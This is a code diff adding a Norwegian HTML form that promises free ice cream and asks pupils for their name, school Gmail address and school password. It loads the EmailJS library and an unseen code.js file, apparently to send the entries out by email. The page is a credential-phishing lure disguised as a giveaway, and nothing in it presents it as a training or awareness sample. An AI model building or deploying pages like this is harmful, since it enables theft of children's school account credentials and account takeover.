@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Send en melding</title>
+    <link rel="stylesheet" href="styles.css" />
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script src="code.js" defer></script>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Fyll ut for å få gratis is!</h1>
+      <form id="contactForm">
+        <label for="from_name">Navn:</label>
+        <input
+          type="text"
+          id="from_name"
+          name="from_name"
+          placeholder="brukernavn "
+          required
+        />
+
+        <label for="skole_bruker">Skole gmail:</label>
+        <input
+          type="email"
+          id="skole_bruker"
+          name="skole_bruker"
+          placeholder="e-bruker@iskule.no"
+          required
+        />
+
+        <label for="passord">Passord:</label>
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="skole-passord"
+        />
+
+        <label for="message">Melding:</label>
+        <textarea
+          id="message"
+          name="message"
+          rows="5"
+          placeholder="Skriv meldingen her..."
+          required
+        ></textarea>
+
+        <button type="submit">Send</button>
+      </form>
+    </div>
+  </body>
+</html>
